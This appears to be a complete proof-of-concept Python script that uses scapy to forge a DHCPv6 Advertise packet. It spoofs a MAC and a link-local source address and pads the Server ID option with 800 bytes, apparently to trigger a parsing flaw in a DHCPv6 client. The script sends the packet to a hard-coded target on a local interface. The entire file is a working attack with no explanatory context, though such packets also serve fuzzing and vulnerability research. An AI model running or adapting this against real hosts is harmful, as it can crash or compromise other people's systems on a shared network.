#!/usr/bin/env python
# encoding: utf-8

from scapy.all import *
from time import sleep

sol = DHCP6_Solicit()
adv = DHCP6_Advertise()
opreq = DHCP6OptOptReq()
et= DHCP6OptElapsedTime()

duid = "00010001236be812000c292038db".decode("hex")
cid = DHCP6OptClientId(duid=duid)
sid = DHCP6OptServerId(duid=duid)
sid.add_payload("s"*800)

iana = DHCP6OptIA_NA(iaid=0xdeadbeef, ianaopts=DHCP6OptIAAddress(addr="fe80::431a:39d4:839d:215c"))

l2 = Ether(src="00:0c:29:27:59:f1")
l3 = IPv6(dst="fe80::431a:39d4:839d:215c", src="fe80::847:8219:1871:5a0f")
l4 = UDP()
pkt = l2/l3/l4/adv/iana/cid/sid

sendp(pkt, iface='ens38')
sleep(0.3)








